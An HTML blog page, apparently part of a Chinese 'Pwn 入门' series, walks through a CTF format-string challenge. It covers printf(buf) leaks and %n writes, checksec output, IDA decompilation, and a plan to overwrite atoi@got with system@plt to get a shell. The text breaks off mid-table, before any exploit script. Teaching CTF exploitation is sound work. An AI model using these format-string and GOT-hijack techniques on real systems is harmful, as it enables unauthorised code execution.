@@ -1,0 +1,1445 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system | Quellisya's Blog</title><meta name="author" content="Quellisya"><meta name="copyright" content="Quellisya"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f3fbf8"><meta name="description" content="从 printf(buf) 这个经典写法出发，讲清楚格式化字符串怎么读栈、怎么用 %p 找偏移、怎么用 %n&#x2F;%hhn 写内存；再结合 Partial RELRO 和 GOT&#x2F;PLT，把 atoi@got 改成 system@plt，第二次输入 &#x2F;bin&#x2F;sh 就能在条件判断里直接拿到 shell。附手动构造 payload 的字节计数过程，以及另一条“泄漏随机数”的解法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system">
+<meta property="og:url" content="https://quellisya.github.io/2026/11/17/pwn-ctf-format-string-pwn5/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="从 printf(buf) 这个经典写法出发，讲清楚格式化字符串怎么读栈、怎么用 %p 找偏移、怎么用 %n&#x2F;%hhn 写内存；再结合 Partial RELRO 和 GOT&#x2F;PLT，把 atoi@got 改成 system@plt，第二次输入 &#x2F;bin&#x2F;sh 就能在条件判断里直接拿到 shell。附手动构造 payload 的字节计数过程，以及另一条“泄漏随机数”的解法。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quellisya.github.io/img/avatar-seal.svg">
+<meta property="article:published_time" content="2026-11-17T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-17T02:00:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content="GOT">
+<meta property="article:tag" content="IDA">
+<meta property="article:tag" content="PLT">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="fmtstr_payload">
+<meta property="article:tag" content="pwntools">
+<meta property="article:tag" content="格式化字符串">
+<meta property="article:tag" content="第五空间2019">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quellisya.github.io/img/avatar-seal.svg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system",
+  "url": "https://quellisya.github.io/2026/11/17/pwn-ctf-format-string-pwn5/",
+  "image": "https://quellisya.github.io/img/avatar-seal.svg",
+  "datePublished": "2026-11-17T02:00:00.000Z",
+  "dateModified": "2026-11-17T02:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Quellisya",
+      "url": "https://github.com/Quellisya"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo-seal.svg"><link rel="canonical" href="https://quellisya.github.io/2026/11/17/pwn-ctf-format-string-pwn5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0f1f22')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#f3fbf8')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/butterfly-custom.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg-ink-tech.svg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">103</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/banner-ink-tech.svg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo-seal.svg" alt="Logo"><span class="site-name">Quellisya's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-layer-group"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fa-fw fab fa-github"></i><span> GitHub</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-17T02:00:00.000Z" title="发表于 2026-11-17 10:00:00">2026-11-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-17T02:00:00.000Z" title="更新于 2026-11-17 10:00:00">2026-11-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/Pwn/">Pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fas fa-layer-group"></i>
+    <span class="series-nav__name">系列：Pwn 入门</span>
+    <span class="series-nav__count">第 6 / 6 篇</span>
+  </div>
+  <ol class="series-nav__list"><li><a href="&#x2F;2026&#x2F;11&#x2F;02&#x2F;pwn-ctf-rip&#x2F;">Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell</a></li><li><a href="&#x2F;2026&#x2F;11&#x2F;05&#x2F;pwn-ctf-warmup-csaw-2016&#x2F;">Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐</a></li><li><a href="&#x2F;2026&#x2F;11&#x2F;06&#x2F;pwn-ctf-ciscn-2019-n-1&#x2F;">Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证</a></li><li><a href="&#x2F;2026&#x2F;11&#x2F;10&#x2F;pwn-ctf-get-started-3dsctf-2016&#x2F;">Pwn 入门：get_started_3dsctf_2016——32 位栈传参、cdecl 与用 exit 收尾</a></li><li><a href="&#x2F;2026&#x2F;11&#x2F;14&#x2F;pwn-ctf-not-the-same-3dsctf-2016&#x2F;">Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</a></li><li class="is-current"><a href="&#x2F;2026&#x2F;11&#x2F;17&#x2F;pwn-ctf-format-string-pwn5&#x2F;">Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__prev" href="&#x2F;2026&#x2F;11&#x2F;14&#x2F;pwn-ctf-not-the-same-3dsctf-2016&#x2F;"><i class="fas fa-arrow-left"></i>Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</a></div>
+</nav><div class="note primary flat"><p><strong>一分钟速览</strong></p>
+<ul>
+<li><strong>难度</strong>：入门（需要先理解栈传参和 GOT&#x2F;PLT，建议做完前面几道 ret2text）</li>
+<li><strong>考点</strong>：格式化字符串、<code>%p</code> &#x2F; <code>%s</code> &#x2F; <code>%n</code> &#x2F; <code>%hhn</code>、栈上参数偏移、GOT 劫持、Partial RELRO、<code>fmtstr_payload</code></li>
+<li><strong>漏洞点</strong>：<code>printf(buf)</code>，<code>buf</code> 完全由用户控制，且没有给 printf 传额外参数</li>
+<li><strong>偏移</strong>：实测 <code>10</code>（缓冲区开头对应 printf 的第 10 个可变参数）</li>
+<li><strong>关键地址</strong>：<code>atoi@got = 0x804c034</code>，<code>system@plt = 0x8049080</code></li>
+<li><strong>利用链</strong>：<code>atoi@got</code> → <code>system@plt</code>；第一次输入写 GOT，第二次输入 <code>/bin/sh</code></li>
+<li><strong>另一条路</strong>：用 <code>%s</code> 泄漏 <code>0x804C044</code> 的随机数，再把它的十进制值当密码发回去</li>
+<li><strong>flag</strong>：<code>CTF2{b0093050-400e-47ba-ac4c-16aa6c066822}</code></li>
+</ul>
+</div>
+
+<div class="note info flat"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>前置知识</strong>：32 位 cdecl 栈传参、GOT&#x2F;PLT 的基本概念、pwntools 的 <code>process</code> &#x2F; <code>remote</code> &#x2F; <code>recvuntil</code>（没做过 32 位 ret2text 的话，先看 <a href="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/">not_the_same</a>）</li>
+<li><strong>阅读方式</strong>：文中穿插了 8 道思考题，答案默认折叠，建议先自己想一遍再展开</li>
+<li><strong>工具</strong>：IDA、gdb + pwndbg、pwntools、<code>readelf</code> &#x2F; <code>objdump</code></li>
+<li><strong>环境</strong>：Linux（Kali &#x2F; Ubuntu）。文中的靶场地址是当时的临时环境，现在多半已经失效，请换成自己的靶场或本地环境</li>
+<li>本文所有操作仅用于<strong>授权靶场和教学</strong>，请勿对未授权的目标做任何测试</li>
+</ul>
+</div>
+
+<div class="note default flat"><p><strong>做题路线</strong></p>
+<p><code>file / checksec</code> → <code>IDA 看 main</code> → <code>确认 printf(buf)</code> → <code>脚本测偏移</code> → <code>找 atoi@got / system@plt</code> → <code>fmtstr_payload 写 GOT</code> → <code>第二次输入 /bin/sh</code> → <code>拿 shell / 读 flag</code></p>
+</div>
+
+<h2 id="这道题在考什么"><a href="#这道题在考什么" class="headerlink" title="这道题在考什么"></a>这道题在考什么</h2><p>这道题用到的是 <code>printf</code> 里的一个漏洞。</p>
+<p>如果你在程序里这样写：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, a, <span class="number">0x56</span>);</span><br><span class="line"><span class="built_in">printf</span>(a);</span><br></pre></td></tr></table></figure>
+
+<p>然后输入：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa%x %x %x</span><br></pre></td></tr></table></figure>
+
+<p>它实际执行的就是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;aaaa%x %x %x&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>printf</code> 看到三个 <code>%x</code>，以为你要给它三个参数，于是去取参数。但代码里根本没有传这三个参数，它取到的是<strong>栈上&#x2F;寄存器里原本就存在的东西</strong>。</p>
+<ul>
+<li><strong>64 位</strong>：前 6 个参数走寄存器（<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>），第 7 个开始才去栈上拿；</li>
+<li><strong>32 位</strong>：参数全部在栈上，<code>printf</code> 直接顺着栈往上读。</li>
+</ul>
+<p>这道题是 32 位，所以问题变成：<strong>它读到的第几个参数，才是我们能控制的那块缓冲区？</strong></p>
+<p>画成栈图大概是这样：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">+--------------------------+</span><br><span class="line">|  ??????                  |  &lt;- 可能是栈上的其他数据</span><br><span class="line">+--------------------------+</span><br><span class="line">|  ??????                  |</span><br><span class="line">+--------------------------+</span><br><span class="line">|  默认第一个参数是 a 的地址 |</span><br><span class="line">+--------------------------+</span><br><span class="line">|  ret                     |</span><br><span class="line">+--------------------------+</span><br><span class="line">|  printf 的格式串指针      |</span><br><span class="line">+--------------------------+</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+
+<p>我们要做的第一件事，就是找到“缓冲区开头”对应第几个参数，也就是<strong>偏移量</strong>。</p>
+<p>光能读还不够，还得能写。格式化字符串里最核心的三个占位符是：</p>
+<table>
+<thead>
+<tr>
+<th>占位符</th>
+<th>作用</th>
+<th>一句话</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%p</code></td>
+<td>把参数当指针&#x2F;整数，按十六进制打印</td>
+<td>泄漏栈上的值</td>
+</tr>
+<tr>
+<td><code>%s</code></td>
+<td>把参数当地址，打印它指向的字符串</td>
+<td>泄漏任意地址的内存</td>
+</tr>
+<tr>
+<td><code>%n</code></td>
+<td>把“已经打印的字符数”写到参数指向的地址</td>
+<td>任意地址写</td>
+</tr>
+</tbody></table>
+<p>其中 <code>%n</code> 是杀伤力最大的，它也是这道题从“读”变成“写”的关键。<code>%n</code> 还有两个变体：</p>
+<table>
+<thead>
+<tr>
+<th>占位符</th>
+<th>对应类型</th>
+<th>写入字节数</th>
+<th>写入范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%n</code></td>
+<td><code>int *</code></td>
+<td>4 字节</td>
+<td><code>0x00000000</code> ~ <code>0xFFFFFFFF</code></td>
+</tr>
+<tr>
+<td><code>%hn</code></td>
+<td><code>short *</code></td>
+<td>2 字节</td>
+<td><code>0x0000</code> ~ <code>0xFFFF</code></td>
+</tr>
+<tr>
+<td><code>%hhn</code></td>
+<td><code>char *</code></td>
+<td>1 字节</td>
+<td><code>0x00</code> ~ <code>0xFF</code></td>
+</tr>
+</tbody></table>
+<p><code>%7$s</code> 这种写法叫<strong>位置参数</strong>：直接取第 7 个参数，不用前面的 <code>%p</code> 一个个占位。<code>%7$p</code> 就是“把第 7 个参数按十六进制打印”，<code>%7$hhn</code> 就是“把字符数写到第 7 个参数指向的地址”。</p>
+<p>理论先说到这里，来看题目。</p>
+<h2 id="第一步：file-与-checksec"><a href="#第一步：file-与-checksec" class="headerlink" title="第一步：file 与 checksec"></a>第一步：file 与 checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file pwn8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/17/pwn-ctf-format-string-pwn5/image-1.png" alt="file 查看文件类型"></p>
+<p><em>图 1：32 位、动态链接、stripped</em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn8: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),</span><br><span class="line">dynamically linked, interpreter /lib/ld-linux.so.2,</span><br><span class="line">for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+<th>对做题的影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ELF 32-bit</code></td>
+<td>32 位可执行文件</td>
+<td>地址 4 字节，用 <code>p32</code></td>
+</tr>
+<tr>
+<td><code>LSB</code></td>
+<td>小端序</td>
+<td>低字节放低地址</td>
+</tr>
+<tr>
+<td><code>Intel 80386</code></td>
+<td>i386 架构</td>
+<td>参数走栈</td>
+</tr>
+<tr>
+<td><code>dynamically linked</code></td>
+<td>动态链接</td>
+<td>有 GOT&#x2F;PLT，函数地址受 libc 影响</td>
+</tr>
+<tr>
+<td><code>stripped</code></td>
+<td>符号表被去掉</td>
+<td>IDA 里函数名是 <code>sub_xxx</code>，但导入函数名还在</td>
+</tr>
+<tr>
+<td><code>for GNU/Linux 3.2.0</code></td>
+<td>目标内核版本</td>
+<td>老题常见</td>
+</tr>
+</tbody></table>
+<p>再看保护：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=pwn8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/17/pwn-ctf-format-string-pwn5/image-2.png" alt="checksec 查看保护"></p>
+<p><em>图 2：Canary found、NX enabled、Partial RELRO、No PIE</em></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>逐个解释：</p>
+<table>
+<thead>
+<tr>
+<th>保护</th>
+<th>本题</th>
+<th>对利用的影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Canary</strong></td>
+<td>found</td>
+<td>栈溢出会被检测；但这题不靠溢出</td>
+</tr>
+<tr>
+<td><strong>NX</strong></td>
+<td>enabled</td>
+<td>栈不可执行，不能放 shellcode</td>
+</tr>
+<tr>
+<td><strong>PIE</strong></td>
+<td>No PIE</td>
+<td>代码段基址固定，GOT&#x2F;PLT 地址可以写死</td>
+</tr>
+<tr>
+<td><strong>RELRO</strong></td>
+<td>Partial RELRO</td>
+<td><strong>GOT 可写</strong>，这是 GOT 劫持的前提</td>
+</tr>
+</tbody></table>
+<p><code>Partial RELRO</code> 这个信息非常关键。它暗示了另一条漏洞利用路线：<strong>GOT 表可以被改写</strong>。</p>
+<h2 id="第二步：IDA-看-main"><a href="#第二步：IDA-看-main" class="headerlink" title="第二步：IDA 看 main"></a>第二步：IDA 看 main</h2><p>把 <code>pwn8</code> 拖进 IDA，找到 <code>main</code>，按 <code>F5</code>：</p>
+<p><img src="/2026/11/17/pwn-ctf-format-string-pwn5/image.png" alt="IDA 中的 main"></p>
+<p><em>图 3：<code>printf(buf)</code> 是漏洞点，后面还有 <code>atoi(nptr)</code> 和 <code>system(&quot;/bin/sh&quot;)</code></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xFu</span>);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14u</span>) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逐段看：</p>
+<table>
+<thead>
+<tr>
+<th>代码</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>setvbuf(stdout, 0, 2, 0)</code></td>
+<td>把 stdout 设成<strong>无缓冲</strong>，输出立刻发出去</td>
+</tr>
+<tr>
+<td><code>open(&quot;/dev/urandom&quot;, 0)</code> + <code>read(..., 4u)</code></td>
+<td>从 <code>/dev/urandom</code> 读 4 字节随机数到 <code>dword_804C044</code>（<code>0x804C044</code>）</td>
+</tr>
+<tr>
+<td><code>printf(&quot;your name:&quot;)</code></td>
+<td>提示输入姓名</td>
+</tr>
+<tr>
+<td><code>read(0, buf, 0x63u)</code></td>
+<td>往 <code>buf</code> 读最多 <strong>99</strong> 字节（<code>0x63</code>）</td>
+</tr>
+<tr>
+<td><code>printf(&quot;Hello,&quot;)</code></td>
+<td>打印问候</td>
+</tr>
+<tr>
+<td><strong><code>printf(buf)</code></strong></td>
+<td><strong>漏洞点</strong>：把用户输入直接当格式串</td>
+</tr>
+<tr>
+<td><code>printf(&quot;your passwd:&quot;)</code></td>
+<td>提示输入密码</td>
+</tr>
+<tr>
+<td><code>read(0, nptr, 0xFu)</code></td>
+<td>往 <code>nptr</code> 读最多 <strong>15</strong> 字节</td>
+</tr>
+<tr>
+<td><code>atoi(nptr) == dword_804C044</code></td>
+<td>把密码转成整数，和随机数比较</td>
+</tr>
+<tr>
+<td><code>system(&quot;/bin/sh&quot;)</code></td>
+<td>比较成功就给 shell</td>
+</tr>
+</tbody></table>
+<p>所以这题有两条路：</p>
+<table>
+<thead>
+<tr>
+<th>路线</th>
+<th>思路</th>
+<th>难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>A：泄漏随机数</strong></td>
+<td>用 <code>%s</code> 读出 <code>0x804C044</code> 的 4 字节随机数，再把它的十进制值当密码发回去</td>
